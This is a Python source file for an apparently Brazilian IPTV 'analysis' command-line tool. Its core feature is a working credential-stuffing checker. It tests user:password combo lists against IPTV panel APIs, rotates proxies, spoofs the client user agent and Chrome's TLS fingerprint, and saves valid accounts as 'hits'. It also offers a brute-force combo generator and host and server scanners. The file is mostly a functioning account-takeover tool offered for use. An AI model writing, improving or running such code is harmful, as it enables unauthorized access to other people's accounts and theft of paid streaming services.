import os
import sys
import time
import json
import threading
from concurrent.futures import ThreadPoolExecutor
from curl_cffi import requests
from urllib3.exceptions import InsecureRequestWarning

import scanner_hosts
import server_analyzer
import leitor_grade
import gerador_combos
from config import *

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def clear(): os.system('cls' if os.name == 'nt' else 'clear')

def banner():
    clear()
    print(f"""{C}
 ╦╔═╗╔╦╗╦  ╦  ╔═╗╔═╗╔═╗╔╗╔╔╗╔╔═╗╦═╗
 ║╠═╝ ║ ╚╗╔╝  ╚═╗║  ╠═╣║║║║║║║╣ ╠╦╝
 ╩╩   ╩  ╚╝   ╚═╝╚═╝╩ ╩╝╚╝╝╚╝╚═╝╩╚═ {W}
      {P}Script de Análise IPTV v{VERSAO_ATUAL}{W}
    """)

def check_updates():
    try:
        req = requests.get(URL_UPDATE, timeout=5)
        if req.status_code == 200:
            dados = req.json()
            if dados["versao"] != VERSAO_ATUAL:
                print(f"{Y}[!] ATUALIZAÇÃO DISPONÍVEL: v{dados['versao']}{W}")
                print(f"{C}[*] O que há de novo: {dados['changelog']}{W}")
                print(f"{C}[*] Atualize no GitHub: {dados['link_download']}{W}\n")
                time.sleep(2)
    except: pass

def get_proxies():
    try:
        req = requests.get(URL_PROXIES, timeout=5)
        if req.status_code == 200:
            return [p.strip() for p in req.text.split('\n') if p.strip()]
    except: pass
    return []

def checker_m3u():
    print(f"\n{C}=== 🔍 SCANNER M3U ==={W}")
    combo_path = input(f"{Y}Caminho da combo (.txt) ou arraste o arquivo aqui: {W}").strip().strip("'").strip('"')
    if not os.path.exists(combo_path):
        print(f"{R}Arquivo não encontrado!{W}")
        time.sleep(2); return
        
    host = input(f"{Y}URL do Host (ex: http://painel.com:80): {W}").strip()
    threads_limit = int(input(f"{Y}Quantidade de Threads (ex: 20): {W}").strip() or 20)
    
    with open(combo_path, "r", encoding="utf-8") as f:
        linhas = [l.strip() for l in f.readlines() if ':' in l]
    
    total = len(linhas)
    if total == 0: return print(f"{R}Combo vazia ou inválida!{W}")

    hits, bads, processados = 0, 0, 0
    hits_path = os.path.join(PASTA_DOWNLOADS, f"HITS_M3U_{int(time.time())}.txt")
    lock = threading.Lock()
    proxies = get_proxies()

    print(f"\n{C}Iniciando Scan de {total} linhas no host {host}...{W}")

    def worker(linha):
        nonlocal hits, bads, processados
        try:
            usr, pwd = linha.split(':', 1)
            api_url = f"{host.rstrip('/')}/player_api.php?username={usr}&password={pwd}"
            px = {"http": f"http://{proxies[processados % len(proxies)]}", "https": f"http://{proxies[processados % len(proxies)]}"} if proxies else None
            
            headers = {"User-Agent": "IPTVSmartersPro", "Accept": "*/*"}
            resp = requests.get(api_url, proxies=px, headers=headers, timeout=10, verify=False, impersonate="chrome110")
            
            is_hit = False
            if resp.status_code == 200:
                dados = resp.json()
                u_info = dados.get('user_info', {})
                if u_info.get('auth') in [1, "1"] or str(u_info.get('status')).lower() in ['active', 'ativo']:
                    is_hit = True
                    with lock:
                        with open(hits_path, "a", encoding="utf-8") as hf:
                            hf.write(f"✅ CONTA ATIVA | User: {usr} | Pass: {pwd} | Host: {host} | Validade: {u_info.get('exp_date', 'N/A')}\n")
            
            with lock:
                if is_hit: hits += 1
                else: bads += 1
                processados += 1
                print(f"\r{Y}Testando: {processados}/{total} | {G}Hits: {hits}{W} | {R}Bads: {bads}{W}", end="")
        except:
            with lock: bads += 1; processados += 1

    with ThreadPoolExecutor(max_workers=threads_limit) as executor:
        for linha in linhas: executor.submit(worker, linha)
        
    print(f"\n\n{G}✅ Finalizado! Hits salvos em: {hits_path}{W}")
    input(f"{P}Pressione ENTER para voltar...{W}")

def menu_listas_free():
    print(f"\n{C}=== 📋 LISTAS IPTV GRÁTIS (NUVEM) ==={W}")
    try:
        req = requests.get(URL_FREELISTS, timeout=5)
        listas = req.json().get("listas", [])
        if not listas: print(f"{R}Nenhuma lista no momento.{W}")
        else:
            for i, lst in enumerate(listas):
                print(f"\n{G}[{i+1}] {lst.get('nome', 'Sem Nome')}{W}")
                print(f"{Y}Data:{W} {lst.get('data', 'N/A')}")
                print(f"{C}Conteúdo/M3U:{W} {lst.get('texto', '')}")
                print("-" * 30)
    except: print(f"{R}Erro ao conectar no GitHub para buscar listas.{W}")
    input(f"\n{P}Pressione ENTER para voltar...{W}")

def main():
    check_updates()
    while True:
        banner()
        print(f"{G}[1]{W} 🔍 Scanner M3U (Testar Combos)")
        print(f"{G}[2]{W} 🌍 Scanner de Hosts")
        print(f"{G}[3]{W} 📺 Leitor de Grade")
        print(f"{G}[4]{W} ☢️ Raio-X de Servidor")
        print(f"{G}[5]{W} 🛠️ Gerador de Combos")
        print(f"{G}[6]{W} 📋 Listas IPTV Grátis (Nuvem)")
        print(f"{P}[7]{W} ℹ️  Sobre")
        print(f"{R}[0]{W} ❌ Sair\n")
        
        opc = input(f"{C}Escolha uma opção: {W}").strip()
        
        if opc == '1': checker_m3u()
        elif opc == '2':
            print(f"\n{C}=== 🌍 SCANNER DE HOSTS ==={W}")
            caminho = input(f"{Y}Caminho do .txt com os links: {W}").strip().strip("'").strip('"')
            try:
                with open(caminho, 'r') as f: urls = [l.strip() for l in f.readlines() if l.strip()]
                scanner_hosts.process_hosts_list(urls, 15)
            except: print(f"{R}Arquivo não encontrado.{W}")
            input(f"{P}Pressione ENTER para voltar...{W}")
            
        elif opc == '3':
            print(f"\n{C}=== 📺 LEITOR DE GRADE ==={W}")
            dados = input(f"{Y}Digite (link usuario senha separador por espaço): {W}").split()
            if len(dados) == 3:
                info = leitor_grade.get_iptv_info(dados[0], dados[1], dados[2], get_proxies())
                if info["status"]: print(f"\n{G}Catálogo: {info['live']} Canais | {info['vod']} Filmes | {info['series']} Séries{W}\n")
                else: print(f"\n{R}Falha: {info['error']}{W}\n")
            else: print(f"{R}Formato inválido.{W}")
            input(f"{P}Pressione ENTER para voltar...{W}")
            
        elif opc == '4':
            print(f"\n{C}=== ☢️ RAIO-X ==={W}")
            url = input(f"{Y}URL (ex: http://painel.com:80): {W}")
            dados = server_analyzer.analisar_servidor_real(url)
            print(f"\n{G}IP:{W} {dados['ip']} | {G}Local:{W} {dados['country']} | {G}Sistema:{W} {dados['system']}\n")
            input(f"{P}Pressione ENTER para voltar...{W}")
            
        elif opc == '5':
            print(f"\n{C}=== 🛠️ GERADOR DE COMBOS VIP ==={W}")
            print(f"{G}[1]{W} 👤 Nomes + Números")
            print(f"{G}[2]{W} 🔢 Apenas Números")
            print(f"{G}[3]{W} 🔤 Apenas Letras")
            print(f"{G}[4]{W} 🔀 Alfanumérico")
            
            escolha = input(f"{Y}Escolha o padrão do usuário (1-4): {W}").strip()
            tipos = {'1': 'nome_num', '2': 'numerico', '3': 'letras', '4': 'alfa'}
            tipo_escolhido = tipos.get(escolha, 'alfa')
            
            try:
                qtd = int(input(f"{Y}Quantas linhas? (Ex: 5000): {W}") or 5000)
                len_u = int(input(f"{Y}Tamanho do user (Ex: 8): {W}") or 8)
                len_p = int(input(f"{Y}Tamanho da senha (Ex: 6): {W}") or 6)
                
                arquivo = gerador_combos.gerar_combo_arquivo(tipo_escolhido, qtd, len_u, len_p, "lower", "lower")
                
                print(f"\n{G}✅ COMBO GERADA COM SUCESSO!{W}")
                print(f"{C}⚙️ Padrão:{W} {tipo_escolhido.upper()} | {C}Quantidade:{W} {qtd:,}")
                print(f"{G}📁 Salvo em:{W} {arquivo}")
            except ValueError: print(f"{R}Erro: Digite apenas números válidos.{W}")
            input(f"\n{P}Pressione ENTER para voltar...{W}")
            
        elif opc == '6': menu_listas_free()
        elif opc == '7':
            print(f"\n{P}=== SOBRE O SISTEMA ==={W}")
            print(f"{C}Criado e Desenvolvido por:{W} {G}@Digital_Apps{W}")
            print(f"{C}Versão Atual:{W} {VERSAO_ATUAL}")
            print(f"{C}Objetivo:{W} Ferramenta CLI de alta performance para varredura e análise IPTV.")
            input(f"\n{P}Pressione ENTER para voltar...{W}")
            
        elif opc == '0':
            print(f"{G}Saindo...{W}"); sys.exit()

if __name__ == "__main__": main()
